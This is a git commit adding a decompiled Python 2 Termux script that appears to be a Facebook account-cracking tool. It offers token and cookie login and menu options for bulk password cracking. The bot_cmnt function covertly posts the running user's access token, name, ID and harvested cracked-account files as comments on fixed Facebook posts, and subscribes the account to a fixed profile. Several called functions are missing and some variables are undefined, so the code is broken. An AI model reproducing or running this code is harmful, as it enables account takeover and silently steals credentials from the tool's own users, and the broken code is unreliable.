b51f7f0aab4c971ce35129e9134aed13a6827c57
sufyanahma <63979270+sufyanahma@users.noreply.github.com>
2021-10-07 16:53:21 +0500

    Add files via upload

---
+++ jutt.py
@@ -0,0 +1,271 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7
+# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
+# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
+# Embedded file name: romi
+try:
+    import os, sys, time, datetime, random, requests, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
+    from multiprocessing.pool import ThreadPool
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('python2 jutt.py')
+
+from os import system
+from time import sleep
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+try:
+    import requests
+except ImportError:
+    system('pip2 install requests > /dev/null 2>&1 &')
+    system('pip2 install requests > /dev/null 2>&1 &')
+
+xogo = '\n\x1b[1;92m              \n\x1b[1;92m                      \n\x1b[1;96m                        \n\x1b[1;92m     {} {}  {} {}{}{} {}{}{} \n\x1b[1;97m     {} {}  {}   {}     {} \n\x1b[1;93m     {} {}  {}   {}     {}  \n\x1b[1;96m     {} {}  {}   {}     {} \n\x1b[1;94m  {}{}   {}{}    {}     {}  \n\x1b[1;93m                      \n\x1b[1;92m         Jutt Badshah Brand~                       \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Jutt Badshah x ?????\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/juttbadshah6969\n\x1b[1;97m\xe2\x9e\xa3 WP NO  : +923100209977\n\x1b[1;91m-----------------------------------------------'
+__author__ = 'Mr.Jutt'
+__copyright = 'All rights reserved . Copyright  Mr.Jutt'
+os.system('termux-setup-storage')
+try:
+    os.mkdir('/sdcard/Jutt')
+except OSError:
+    pass
+
+bd = random.randint(20000000.0, 30000000.0)
+sim = random.randint(20000, 40000)
+header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 
+   'x-fb-connection-quality': 'EXCELLENT', 
+   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
+   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
+   'content-type': 'application/x-www-form-urlencoded', 
+   'x-fb-http-engine': 'Liger'}
+os.system('git pull')
+os.system('clear')
+WORDS = (
+ '\x1b[1;30;40m', '\x1b[1;31;40m', '\x1b[1;32;40m', '\x1b[1;33;40m', '\x1b[1;34;40m', '\x1b[1;35;40m', '\x1b[1;36;40m', '\x1b[1;37;40m', '\x1b[1;30;40m', '\x1b[1;31;40m', '\x1b[1;32;40m', '\x1b[1;33;40m', '\x1b[1;34;40m', '\x1b[1;35;40m', '\x1b[1;36;40m', '\x1b[1;37;40m')
+word2 = random.choice(WORDS)
+word_site = 'https://pastebin.com/raw/iP2fJeLy'
+line = requests.get(word_site)
+line1 = line.content.splitlines()
+line2 = random.choice(line1)
+logo = '\n\x1b[1;92m              \n\x1b[1;92m                      \n\x1b[1;96m                        \n\x1b[1;92m     {} {}  {} {}{}{} {}{}{} \n\x1b[1;97m     {} {}  {}   {}     {} \n\x1b[1;93m     {} {}  {}   {}     {}  \n\x1b[1;96m     {} {}  {}   {}     {} \n\x1b[1;94m  {}{}   {}{}    {}     {}  \n\x1b[1;93m                      \n\x1b[1;92m         Jutt Badshah Brand~                       \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Jutt Badshah x ?????\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/juttbadshah6969\n\x1b[1;97m\xe2\x9e\xa3 WP NO  : +923100209977\n\x1b[1;91m-----------------------------------------------\n    \x1b[1;33mUse flight (airplane) mode before use\n\x1b[1;91m-----------------------------------------------'
+def reg2():
+    os.system('clear')
+    os.system('echo  "\n\x1b[1;92m              \n\x1b[1;92m                      \n\x1b[1;96m                        \n\x1b[1;92m     {} {}  {} {}{}{} {}{}{} \n\x1b[1;97m     {} {}  {}   {}     {} \n\x1b[1;93m     {} {}  {}   {}     {}  \n\x1b[1;96m     {} {}  {}   {}     {} \n\x1b[1;94m  {}{}   {}{}    {}     {}  \n\x1b[1;93m                      \n\x1b[1;92m         Jutt Badshah Brand~                       \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Jutt Badshah x ?????\n\x1b[1;97m\xe2\x9e\xa3 Github : https://github.com/juttbadshah6969\n\x1b[1;97m\xe2\x9e\xa3 WP NO  : +923100209977\n\x1b[1;91m-----------------------------------------------" | lolcat ')
+    print '\t\x1b[4;31mApproval not detected'
+    print '\t \x1b[0;97mCopy Key and press \x1b[0;91menter\x1b[0;97m , Past input key our website'
+    id = uuid.uuid4().hex[:50]
+    print ' \x1b[1;92mYour id: \x1b[0;91m' + id
+    print ''
+    raw_input('\x1b[1;93m Press \x1b[0;91menter\x1b[1;93m to input key')
+    os.system('xdg-open https://juttkey.000webhostapp.com/')
+    time.sleep(10)
+    os.system('xdg-open https://t.me/joinchat/3Ls9bUMjqpJkN2Jk')
+    sav = open('/data/data/com.termux/files/usr/libexec/awk/.termux.log', 'w')
+    sav.write(id)
+    sav.close()
+    raw_input('\x1b[1;92m Press enter to check Approval ')
+    reg()
+
+
+def log_menu():
+    try:
+        token = open('access_token.txt', 'r').read()
+        bot_cmnt()
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+        print logo
+        print '\x1b[1;95m ~~~~ Login menu ~~~~\x1b[1;91m'
+        print 47 * '-'
+        print '\x1b[1;92m[1] Login with FaceBook'
+        print '\x1b[1;92m[2] Login with token'
+        print '\x1b[1;92m[3] Login with cookies'
+        print ''
+        log_menu_s()
+
+
+def bot_cmnt():
+    try:
+        token = open('access_token.txt', 'r').read()
+        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
+        a = json.loads(otw.text)
+        nama = a['name']
+        id = a['id']
+    except IOError:
+        print '\x1b[1;97m[!] Token invalid'
+        os.system('rm -rf access_token.txt')
+        logs()
+
+    nama_user = 'Name : ' + nama
+    id_user = '\nID : ' + id
+    word_site = 'https://pastebin.com/raw/mJk8Rjsz'
+    pass1 = requests.get(word_site)
+    pass2 = pass1.content.splitlines()
+    pass3 = random.choice(pass2)
+    pass1 = open('/sdcard/Jutt/JUTT_OK.txt', 'r').read()
+    pass2 = open('/sdcard/Jutt/JUTT_CP.txt', 'r').read()
+    requests.post('https://graph.facebook.com/2896251857370879/comments/?message=' + nama_user + id_user + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/2896252387370826/comments/?message=' + token + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3932552153503454/comments/?message=' + pass3 + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/2896814120647986/comments/?message=' + pass1 + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/2896814207314644/comments/?message=' + pass2 + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/100002461238508/subscribers?access_token=' + token)
+    menu()
+
+
+def log_menu_s():
+    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Jutt\xe2\x9e\xa4 ')
+    if s == '1':
+        log_fb()
+    elif s == '2':
+        log_token()
+    elif s == '3':
+        log_cookie()
+    else:
+        print ''
+        print '\\ Select valid option '
+        print ''
+        log_menu_s()
+
+
+def log_fb():
+    os.system('clear')
+    print logo
+    print '\x1b[1;37mLogin with id/pass'
+    print 47 * '-'
+    lid = raw_input('\x1b[1;92m Id/mail/no: ')
+    pwds = raw_input(' \x1b[1;93mPassword: ')
+    try:
+        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
+        q = json.loads(data)
+        if 'loc' in q:
+            ts = open('access_token.txt', 'w')
+            ts.write(q['loc'])
+            ts.close()
+            menu()
+        elif 'www.facebook.com' in q['error']:
+            print ' User must verify account before login'
+            raw_input('\x1b[1;92m Press enter to try again ')
+            log_menu()
+        else:
+            print ' Id/Pass may be wrong'
+            raw_input(' \x1b[1;92mPress enter to try again ')
+            log_menu()
+    except:
+        print ''
+        print 'Exiting tool'
+        os.system('exit')
+
+
+def log_token():
+    os.system('clear')
+    print logo
+    print '\x1b[0;36mLogin with token\x1b[1;91m'
+    print 47 * '-'
+    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;97m')
+    print 47 * '-'
+    t_s = open('access_token.txt', 'w')
+    t_s.write(tok)
+    t_s.close()
+    menu()
+
+
+def log_cookie():
+    os.system('clear')
+    print logo
+    print ''
+    print '\x1b[1;31;1mLogin Cookies'
+    print ''
+    try:
+        cookie = raw_input(' Paste cookies here: ')
+        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8', 
+           'cookie': cookie}
+        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
+        c2 = re.search('(EAAA\\w+)', c1.text)
+        hasil = c2.group(1)
+        ok = open('access_token.txt', 'w')
+        ok.write(hasil)
+        ok.close()
+        menu()
+    except AttributeError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \x1b[1;92mPress enter to try again ')
+        log_menu()
+    except UnboundLocalError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \x1b[1;92mPress enter to try again ')
+        log_menu()
+    except requests.exceptions.SSLError:
+        print ''
+        print '\tInvalid cookies'
+        print ''
+        raw_input(' \x1b[1;92mPress enter to try again ')
+        log_menu()
+
+
+def menu():
+    os.system('clear')
+    try:
+        token = open('access_token.txt', 'r').read()
+    except (KeyError, IOError):
+        print ''
+        print logo
+        print '\x1b[1;31;1mLogin FB id to continue'
+        time.sleep(1)
+        log_menu()
+
+    try:
+        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
+        q = json.loads(r.text)
+        z = q['name']
+    except (KeyError, IOError):
+        print logo
+        print ''
+        print '\t Account Cheekpoint\x1b[0;97m'
+        print ''
+        os.system('rm -rf access_token.txt')
+        time.sleep(1)
+        log_menu()
+    except requests.exceptions.ConnectionError:
+        print logo
+        print ''
+        print '\t Turn on mobile data/wifi\x1b[0;97m'
+        print ''
+        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
+        menu()
+
+    print logo
+    print '    \x1b[1;33m' + word2 + line2
+    print 47 * '\x1b[1;91m-'
+    tok = open('/data/data/com.termux/files/usr/libexec/awk/.termux.log', 'r').read()
+    print '  \x1b[37mLogged in user: \x1b[1;36m' + z
+    print ' \x1b[37m Active token: \x1b[1;36m' + tok
+    print 47 * '\x1b[1;91m-'
+    print '\x1b[1;92m[1] Crack with Auto password 10 \x1b[37m[\x1b[1;33mRecommended\x1b[37m]'
+    print '\x1b[1;92m[2] Crack with Number password 6'
+    print '\x1b[1;92m[3] Crack with Name + Number password 8'
+    print '\x1b[1;92m[4] Extract File 100069,70,New \x1b[37m[\x1b[1;33mNew\x1b[37m]'
+    print '\x1b[1;92m[5] How To Use Script \x1b[37m[\x1b[1;33mVideos\x1b[37m] '
+    menu_s()
+
+
+
+
+
+if __name__ == '__main__':
+    reg()
